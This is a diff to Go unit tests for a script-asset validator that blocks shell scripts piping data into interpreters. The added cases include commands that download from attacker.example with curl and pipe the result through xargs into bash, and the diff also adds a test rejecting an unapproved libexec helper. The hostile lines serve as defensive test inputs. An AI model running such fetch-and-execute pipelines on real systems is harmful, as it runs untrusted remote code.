@@ -279,6 +279,8 @@ func TestValidateScriptAssetRejectsInterpreterPipelines(t *testing.T) {
 		"#!/bin/bash\n/usr/bin/printf payload | { /usr/bin/node; }\n",
 		"#!/bin/bash\n/usr/bin/printf payload | exec -a hook-shell /bin/bash\n",
 		"#!/bin/bash\n/usr/bin/printf payload |& /bin/sh\n",
+		"#!/bin/bash\n/usr/bin/curl https://attacker.example | /usr/bin/xargs /bin/bash -c\n",
+		"#!/bin/bash\n/usr/bin/curl https://attacker.example | /usr/bin/xargs -I{} /bin/bash -c '{}'\n",
 	} {
 		if err := validateScriptAsset([]byte(script)); err == nil ||
 			!strings.Contains(err.Error(), "interpreter pipeline") {
@@ -292,10 +294,19 @@ func TestValidateScriptAssetAllowsNonInterpreterPipeline(t *testing.T) {
 		"#!/bin/bash\n/usr/bin/printf data | /usr/bin/grep data\n",
 		"#!/bin/bash\n/usr/bin/printf data | command -v bash\n",
 		"#!/bin/bash\n/usr/bin/printf data | /usr/bin/python-build-tool\n",
+		"#!/bin/bash\n/usr/bin/printf data | /usr/bin/xargs -n 1\n",
 	} {
 		if err := validateScriptAsset([]byte(script)); err != nil {
 			t.Fatalf("validateScriptAsset(%q) error = %v, want non-interpreter pipeline allowance", script, err)
 		}
+	}
+}
+
+func TestValidateScriptAssetRejectsUnapprovedLibexecDescendant(t *testing.T) {
+	const script = "#!/bin/sh\n/usr/local/libexec/user-tools/helper\n"
+	if err := validateScriptAsset([]byte(script)); err == nil ||
+		!strings.Contains(err.Error(), "mutable command path") {
+		t.Fatalf("validateScriptAsset() error = %v, want unapproved-libexec rejection", err)
 	}
 }
 
